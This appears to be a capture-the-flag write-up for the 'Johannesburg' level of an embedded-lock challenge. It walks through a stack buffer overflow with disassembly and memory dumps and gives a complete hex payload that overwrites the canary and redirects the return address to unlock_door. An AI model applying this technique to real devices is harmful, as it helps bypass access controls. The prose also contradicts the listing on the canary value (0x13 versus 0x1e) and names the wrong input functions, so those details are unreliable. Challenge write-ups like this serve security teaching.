# Johannesburg

### Problem

This is a simple stack buffer overflow problem with a stack canary.

### Solution

Although the program prints a statement that the password must be between 8 and 16 characters, when we look at the login function it pushes `0x3f` as the second argument of `gets`. As a result, this allows for an overflow of the password buffer.

```
453e:  3f40 9c44      mov	#0x449c "Remember: ...(removed)", r15
4542:  b012 f845      call	#0x45f8 <puts>
4546:  3e40 3f00      mov	#0x3f, r14
454a:  3f40 0024      mov	#0x2400, r15
454e:  b012 e845      call	#0x45e8 <getsn>
```

If we look at the location of the stack pointer before the strcpy is executed, this is what we see. The `sp` is currently `0x43ec`. An important thing to notice, is that at the end of the second line, memory address `0x43fe` is the return address for the login function. 

```
43e0:   0000 f245 0200 0024 3f00 5245 0000 0000   ...E...$?.RE....
43f0:   0000 0000 0000 0000 0000 0000 001e 3c44   ..............<D
```

Knowing the location of the return address, and because it is possible to overwrite with the buffer overflow vulnerability, we can jump to any location. The obvious location would be the call to `unlock_door`

```
4566:  b012 4644      call	#0x4446 <unlock_door>
456a:  3f40 d144      mov	#0x44d1 "Access granted.", r15
```

Finally, before exiting the login function there is a simple canary check to see if the password was too long. `0x11(sp)` is being compared to `0x13` as the stack canary. If the canary has been overwritten incorrectly, then the program will stop executing before returning. So, we simply need to overwrite the canary with the expected value.

```
4578:  f190 1e00 1100 cmp.b	#0x1e, 0x11(sp)
457e:  0624           jeq	#0x458c <login+0x60>
4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call	#0x45f8 <puts>
4588:  3040 3c44      br	#0x443c <__stop_progExec__>
```

The final exploit is `1e1e1e1e1e1e1e1e1e1e1e1e1e1e1e1e1e1e6645` which will write the stack canary up to the return address, then the return address is overwritten with 6645 which represents the call to `unlock_door`.

